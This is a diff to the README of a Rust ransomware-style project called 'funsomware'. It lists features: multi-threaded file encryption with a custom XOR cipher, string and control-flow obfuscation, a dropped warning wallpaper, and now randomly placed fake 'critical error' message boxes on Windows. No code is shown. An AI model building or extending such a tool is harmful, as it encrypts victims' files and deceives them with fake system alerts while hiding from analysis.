@@ -7,7 +7,7 @@ A Rust-based file encryption tool with obfuscated code using the `cryptify` crat
 - **Multi-threaded processing**: Uses 64 threads by default (configurable)
 - **Fast XOR cipher**: Custom FNV-1a-inspired stream cipher for fast encryption
 - **Code obfuscation**: All strings and control flows obfuscated with `cryptify`
-- **Cross-platform GUI**: Native message boxes on Windows and Linux
+- **Windows message boxes**: Random-positioned message boxes all over the screen (Windows only)
 - **Wallpaper changer**: Drops and sets a custom wallpaper after encryption
 - **Embedded resources**: Wallpaper image embedded in the binary
 - **Configurable**: Easy-to-modify configuration in `src/config.rs`
@@ -25,7 +25,7 @@ Edit `src/config.rs` to customize:
 - `SHOW_CLI`: Show debug output (default: `true`)
 - `SHOW_MESSAGEBOXES`: Show GUI message boxes (default: `true`)
 - `MESSAGEBOX_LOOP_COUNT`: How many times to show the message box (default: `100`, set to `0` for infinite)
-- `MESSAGEBOX_DELAY_SECONDS`: Delay between message boxes in seconds (default: `2`)
+- `MESSAGEBOX_DELAY_MS`: Delay between message boxes in milliseconds (default: `2000`)
 - `SET_WALLPAPER`: Change desktop wallpaper after encryption (default: `true`)
 - `MESSAGEBOX_TITLE`: Custom message box title (default: "⚠ CRITICAL SYSTEM ERROR ⚠")
 - `MESSAGEBOX_TEXT`: Custom message box text (default: cryptic error message)
@@ -59,10 +59,13 @@ Or run the binary directly:
    - Sleeps for a random duration (1-5 seconds)
    - Writes the encrypted data back to the file
 5. **Extracts and sets wallpaper** to warning screen
-6. **Spawns message box hell** - 100 message boxes appear every 2 seconds (non-blocking) 😈
+6. **Spawns message box hell** (Windows only) - 100 message boxes appear at RANDOM POSITIONS all over the screen! 😈
    - Each message box runs in its own thread
    - They don't wait for user interaction
-   - New ones keep spawning while old ones are still open
+   - **Appear at random screen coordinates** - not in the center!
+   - New ones keep spawning every 2 seconds while old ones are still open
+   - Creates complete desktop chaos
+   - Linux: Message boxes are skipped (Windows-only feature)
 
 ## Encryption Algorithm
 
@@ -108,9 +111,9 @@ funsomware/
 - `rayon` - Data parallelism library
 - `walkdir` - Recursive directory traversal
 - `rand` - Random number generation
-- `native-dialog` - Cross-platform message boxes
 - `wallpaper` - Cross-platform wallpaper setting
 - `dirs-next` - Platform-specific directory detection
+- `winapi` - Windows API for random-positioned message boxes (Windows only)
 
 ### Linux Requirements
 
